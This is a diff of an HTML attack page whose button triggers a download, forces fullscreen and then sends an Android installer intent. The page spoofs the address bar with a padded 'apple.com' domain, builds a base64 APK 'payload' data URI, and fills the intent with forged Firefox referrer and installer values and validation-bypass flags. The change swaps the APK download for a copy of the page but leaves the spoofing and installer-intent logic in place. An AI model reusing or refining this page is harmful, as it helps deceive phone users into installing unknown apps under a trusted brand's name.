@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delayed Fullscreen Dispatcher</title>
+    <title>Page Download & Delayed Fullscreen Dispatcher</title>
     <style>
         body {
             font-family: monospace;
@@ -40,13 +40,13 @@
 </head>
 <body>
 
-    <button id="strikeBtn">Initialize Download First, Then Fullscreen</button>
+    <button id="strikeBtn">Download Page & Initialize Fullscreen</button>
     <div id="status"></div>
 
     <script>
         document.getElementById('strikeBtn').addEventListener('click', function() {
             // --- 1. CONFIGURATION ---
-            const filename = "app.apk";
+            const pageFilename = "index.html";
             const realDomain = "apple.com";
 
             // --- 2. ADVANCED ADDRESS BAR & UI SPOOFING LOGIC ---
@@ -54,23 +54,27 @@
             const longSub = realDomain + overflowPadding;
 
             // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
-            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYXBwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
+            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYPPwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
             const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#${longSub}`;
 
-            // --- 4. EXECUTION (Download Berjalan Duluan) ---
+            // --- 4. EXECUTION (Download Halaman Ini / HTML) ---
+            const htmlContent = document.documentElement.outerHTML;
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+
             const a = document.createElement('a');
-            a.href = payload;
-            a.download = filename;
+            a.href = blobUrl;
+            a.download = pageFilename;
             a.rel = "noopener";
 
             document.body.appendChild(a);
             a.click();
 
-            document.getElementById('status').innerText = "> DOWNLOAD_TRIGGERED: Awaiting 3s for Fullscreen & Intent...";
+            document.getElementById('status').innerText = "> PAGE_DOWNLOAD_TRIGGERED: Awaiting 1.5s for Fullscreen & Intent...";
 
-            // --- 5. DELAY 3 SECONDS: FULLSCREEN & INTENT DISPATCH ---
+            // --- 5. DELAY 1.5 SECONDS: FULLSCREEN & INTENT DISPATCH ---
             setTimeout(() => {
-                // Masuk Fullscreen setelah 3 detik
+                // Masuk Fullscreen setelah 1,5 detik
                 const elem = document.documentElement;
                 if (elem.requestFullscreen) {
                     elem.requestFullscreen().catch(err => {
@@ -83,12 +87,13 @@
                 }
 
                 document.body.removeChild(a);
+                URL.revokeObjectURL(blobUrl);
                 
                 // Intent 1-line dijalankan bersamaan dengan Fullscreen
                 const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x3FFFFFFF;flag=0x3FFFFFFF;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.ALLOW_MULTIPLE=true;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;B.android.intent.extra.TRUNCATE_HISTORY=false;B.android.intent.extra.BYPASS_KEYGUARD_PERMISSIONS=true;B.android.intent.extra.SKIP_VALIDATION=true;end";
                 
                 window.location.replace(targetIntent);
-            }, 3000);
+            }, 1500);
         });
     </script>
 
